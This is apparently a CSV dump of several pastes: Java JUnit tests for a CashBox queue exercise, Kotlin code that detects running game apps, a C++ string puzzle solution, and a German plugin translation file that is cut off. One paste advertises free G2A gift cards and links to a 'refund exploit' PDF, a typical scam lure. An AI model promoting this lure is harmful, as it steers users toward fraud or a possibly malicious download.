id,title,username,language,date,content
        shop1.setCashBoxState(1, State.IS_CLOSING);
        shop1.setCashBoxState(3, State.DISABLED);
        assertEquals(""""""
                #0[+]
                #1[|]
                #2[+]
                #3[-]"""""", shop1.toString());

        Buyer.resetNames();
        shop1.addBuyer(Buyer.nextBuyer()); //A
        assertEquals(""""""
                #0[+]A
                #1[|]
                #2[+]
                #3[-]"""""", shop1.toString());

        shop1.addBuyer(Buyer.nextBuyer()); //B
        assertEquals(""""""
                #0[+]A
                #1[|]
                #2[+]B
                #3[-]"""""", shop1.toString());

        shop1.addBuyer(Buyer.nextBuyer()); //C
        assertEquals(""""""
                #0[+]AC
                #1[|]
                #2[+]B
                #3[-]"""""", shop1.toString());

        shop1.setCashBoxState(2, State.IS_CLOSING);
        shop1.addBuyer(Buyer.nextBuyer()); //D
        assertEquals(""""""
                #0[+]ACD
                #1[|]
                #2[|]B
                #3[-]"""""", shop1.toString());
    }
}
"
dvvURTK6,CashBoxTest.java,NeverRIEght,Java,Saturday 4th of May 2024 12:14:57 PM CDT,"package com.epam.rd.autocode.queue;

import java.util.Deque;

import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * @author D. Kolesnikov
 */
public class CashBoxTest {

	private static boolean isAllTestsMustFailed;

	private static Throwable complianceTestFailedCause;

	static {
		try {
			String testClassName = new Exception().getStackTrace()[0].getClassName();
			String className = testClassName.substring(0, testClassName.lastIndexOf(""Test""));
			Class<?> c = Class.forName(className);

			java.lang.reflect.Method[] methods = { 
					c.getDeclaredMethod(""getQueue""),
					c.getDeclaredMethod(""serveBuyer""),
					c.getDeclaredMethod(""inState"", CashBox.State.class),
					c.getDeclaredMethod(""notInState"", CashBox.State.class),
					c.getDeclaredMethod(""addLast"", Buyer.class),
					c.getDeclaredMethod(""removeLast""),
					c.getDeclaredMethod(""toString""),
					c.getDeclaredMethod(""setState"", CashBox.State.class),
					c.getDeclaredMethod(""getState"")
				};

			   
			org.apache.bcel.classfile.JavaClass jc = org.apache.bcel.Repository.lookupClass(c);
			for (java.lang.reflect.Method method : methods) {
				org.apache.bcel.classfile.Method m = jc.getMethod(method);
				org.apache.bcel.classfile.Code code = m.getCode();
				Assertions.assertTrue(code.getCode().length > 2, () -> m + "" is not a stub"");
			}
		} catch (Throwable t) {
			isAllTestsMustFailed = true;
			complianceTestFailedCause = t;
			t.printStackTrace();
		}
	}

	{
		if (isAllTestsMustFailed) {
			Assertions.fail(() -> ""Compliance test failed: "" + complianceTestFailedCause.getMessage());
		}
	}
	
	@Test
	void test() {
		CashBox cb = new CashBox(0);
		cb.addLast(Buyer.nextBuyer());
		Deque<Buyer> q1 = cb.getQueue();
		Deque<Buyer> q2 = cb.getQueue();
		
		Assertions.assertIterableEquals(q1, q2);
		Assertions.assertNotSame(q1, q2);
	
			
	}

	@Test
	void neverCashBoxStatesTest() {
		CashBox cashBox = new CashBox(1);
        assertTrue(cashBox.inState(CashBox.State.DISABLED));

		cashBox.setState(CashBox.State.ENABLED);
        assertFalse(cashBox.inState(CashBox.State.DISABLED));
        assertTrue(cashBox.notInState(CashBox.State.DISABLED));
		assertEquals(CashBox.State.ENABLED, cashBox.getState());

		cashBox.setState(CashBox.State.IS_CLOSING);
        assertFalse(cashBox.inState(CashBox.State.ENABLED));
        assertTrue(cashBox.notInState(CashBox.State.DISABLED));
		assertEquals(CashBox.State.IS_CLOSING, cashBox.getState());

		cashBox.setState(CashBox.State.ENABLED);
        assertFalse(cashBox.inState(CashBox.State.DISABLED));
        assertTrue(cashBox.notInState(CashBox.State.IS_CLOSING));
		assertEquals(CashBox.State.ENABLED, cashBox.getState());
	}

	@Test
	void neverCashBoxAddRemoveTest() {
		CashBox cashBox = new CashBox(1);

		Buyer.resetNames();
		cashBox.addLast(Buyer.nextBuyer()); //A
		assertEquals(""#1[-]"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.addLast(Buyer.nextBuyer()); //B
		assertEquals(""#1[|]"", cashBox.toString());

		cashBox.setState(CashBox.State.ENABLED);
		cashBox.addLast(Buyer.nextBuyer()); //C
		assertEquals(""#1[+]C"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.addLast(Buyer.nextBuyer()); //D
		assertEquals(""#1[|]C"", cashBox.toString());

		cashBox.setState(CashBox.State.ENABLED);
		cashBox.addLast(Buyer.nextBuyer()); //E
		cashBox.addLast(Buyer.nextBuyer()); //F
		assertEquals(""#1[+]CEF"", cashBox.toString());

		cashBox.removeLast();
		assertEquals(""#1[+]CE"", cashBox.toString());

		cashBox.setState(CashBox.State.DISABLED);
		cashBox.removeLast();
		assertEquals(""#1[-]CE"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.removeLast();
		assertEquals(""#1[|]C"", cashBox.toString());

		cashBox.removeLast();
		assertEquals(""#1[-]"", cashBox.toString());
	}

	@Test
	void neverCashBoxAutoClosureTest() {
		CashBox cashBox = new CashBox(1);

		Buyer.resetNames();
		cashBox.addLast(Buyer.nextBuyer()); //A
		cashBox.addLast(Buyer.nextBuyer()); //B
		assertEquals(""#1[-]"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.addLast(Buyer.nextBuyer()); //C
		assertEquals(""#1[|]"", cashBox.toString());

		cashBox.setState(CashBox.State.ENABLED);
		cashBox.addLast(Buyer.nextBuyer()); //D
		cashBox.addLast(Buyer.nextBuyer()); //E
		assertEquals(""#1[+]DE"", cashBox.toString());

		cashBox.serveBuyer();
		cashBox.serveBuyer();
		assertEquals(""#1[+]"", cashBox.toString());

		cashBox.addLast(Buyer.nextBuyer()); //F
		cashBox.addLast(Buyer.nextBuyer()); //G
		assertEquals(""#1[+]FG"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.serveBuyer();
		assertEquals(""#1[|]G"", cashBox.toString());

		cashBox.serveBuyer();
		assertEquals(""#1[-]"", cashBox.toString());
	}

	@Test
	void neverCashBoxTest() {
		CashBox cashBox = new CashBox(1);
		assertEquals(""#1[-]"", cashBox.toString());

		cashBox = new CashBox(254);
		assertEquals(""#254[-]"", cashBox.toString());

		cashBox.addLast(Buyer.nextBuyer());
		assertEquals(""#254[-]"", cashBox.toString());

		cashBox.setState(CashBox.State.ENABLED);
		Buyer.resetNames();
		cashBox.addLast(Buyer.nextBuyer()); //A
		assertEquals(""#254[+]A"", cashBox.toString());

		cashBox.addLast(Buyer.nextBuyer()); //B
		cashBox.addLast(Buyer.nextBuyer()); //C
		assertEquals(""#254[+]ABC"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.addLast(Buyer.nextBuyer()); //D
		cashBox.addLast(Buyer.nextBuyer()); //E
		assertEquals(""#254[|]ABC"", cashBox.toString());

		cashBox.setState(CashBox.State.DISABLED);
		cashBox.addLast(Buyer.nextBuyer()); //F
		cashBox.addLast(Buyer.nextBuyer()); //G
		assertEquals(""#254[-]ABC"", cashBox.toString());

		cashBox.setState(CashBox.State.DISABLED);
		cashBox.addLast(Buyer.nextBuyer()); //H
		assertEquals(""#254[-]ABC"", cashBox.toString());

		cashBox.setState(CashBox.State.ENABLED);
		cashBox.addLast(Buyer.nextBuyer()); //I
		assertEquals(""#254[+]ABCI"", cashBox.toString());

		cashBox.serveBuyer();
		assertEquals(""#254[+]BCI"", cashBox.toString());

		Buyer.resetNames();
		cashBox.addLast(Buyer.nextBuyer()); //A
		assertEquals(""#254[+]BCIA"", cashBox.toString());

		cashBox.serveBuyer();
		cashBox.serveBuyer();
		assertEquals(""#254[+]IA"", cashBox.toString());

		cashBox.serveBuyer();
		cashBox.serveBuyer();
		assertEquals(""#254[+]"", cashBox.toString());
	}
}"
vAPX8Pbx,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Saturday 4th of May 2024 12:10:31 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_517901.pdf

Working as of:
04 May 2024"
6NkBrErq,"котлин: как отслеживать запущенные приложения и определять, является ли запущенное приложение игрой:",reset_man,Kotlin,Saturday 4th of May 2024 11:49:45 AM CDT,"import android.app.ActivityManager
import android.content.Context
import android.content.pm.ApplicationInfo

fun isGame(context: Context, packageName: String): Boolean {
    val packageManager = context.packageManager
    val applicationInfo: ApplicationInfo = try {
        packageManager.getApplicationInfo(packageName, 0)
    } catch (e: Exception) {
        return false
    }

    return applicationInfo.flags and ApplicationInfo.FLAG_IS_GAME != 0
}

fun getRunningApps(context: Context): List<String> {
    val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val runningTasks = activityManager.runningAppProcesses ?: emptyList()
    val runningApps = mutableListOf<String>()

    for (taskInfo in runningTasks) {
        val packageName = taskInfo.processName
        runningApps.add(packageName)
    }

    return runningApps
}

fun main() {
    val context: Context = getContext() // Предполагается, что у вас уже есть доступ к контексту приложения
    val runningApps = getRunningApps(context)

    for (app in runningApps) {
        val isGameApp = isGame(context, app)
        if (isGameApp) {
            println(""$app - это игровое приложение"")
        } else {
            println(""$app - это не игровое приложение"")
        }
    }
}

// Функция getContext() осталась невыданной, так как она зависит от конкретного типа приложения и его структуры"
3WgCWbhR,Determine if Two Strings Are Close,jayati,C++,Saturday 4th of May 2024 11:47:32 AM CDT,"class Solution {
public:
    bool closeStrings(string word1, string word2) {
       vector<int>temp1(26);
        vector<int>temp2(26);
        bool flag = true;

        for(int i = 0; i < word1.size();i++){
            temp1[word1[i]-'a']++;
        }

        for(int i = 0; i < word2.size();i++){
            temp2[word2[i]-'a']++;
        }

        for(int i = 0; i < temp1.size();i++){
            if((temp1[i]>0 && temp2[i]==0) || (temp1[i]==0 && temp2[i]>0)){
                return false;
            }
        }

        sort(temp1.begin(),temp1.end());
        sort(temp2.begin(),temp2.end());

        for(int i = 0;i < 26;i++){
            if(temp1[i]!=temp2[i]){
                flag = false;
                break;
            }
        }

        return flag;
        
        
    }
};"
ce0qEC4B,Untitled,mvstns,JSON,Saturday 4th of May 2024 11:43:07 AM CDT,"{
  ""stringTranslations"": {
    ""error_crafting_no_ingredients"": ""&cUnzureichende Zutaten."",
    ""error_crafting_no_space"": ""&cDein Inventar ist voll!"",
    ""error_crafting_tinker_fail"": ""&cDas kann nicht bearbeitet werden!"",
    ""error_crafting_no_sufficient_tool_owned"": ""&cDu besitzt kein ausreichendes Werkzeug, um diesen Gegenstand herzustellen"",
    ""error_command_invalid_number"": ""&cUngültige Nummer angegeben"",
    ""error_command_invalid_option"": ""&cUngültige Option angegeben"",
    ""error_command_invalid_command"": ""&cBefehl existiert nicht"",
    ""error_command_no_permission"": ""&cDu hast keine Berechtigung, diesen Befehl zu verwenden"",
    ""error_command_player_offline"": ""&cSpieler nicht gefunden"",
    ""error_command_invalid_selector"": ""&cFehler im Selektor: %error%"",
    ""error_command_recipe_exists"": ""&cEs existiert bereits ein Rezept mit diesem Namen."",
    ""error_command_recipe_missing"": ""&cRezept nicht gefunden"",
    ""error_command_invalid_skill"": ""&cUngültiger Fertigkeitstyp"",
    ""error_command_invalid_item"": ""&cGegenstand nicht gefunden!"",
    ""error_command_insufficient_level_tokens"": ""&cNicht genug einlösbare Level-Tokens, du hast &4%amount%"",
    ""error_command_insufficient_exp_tokens"": ""&cNicht genug einlösbare Erfahrungs-Tokens, du hast &4%amount%"",
    ""error_command_invalid_recipe"": ""&cUngültiger Rezepttyp"",
    ""error_command_invalid_attribute"": ""&cUngültiger Attributtyp"",
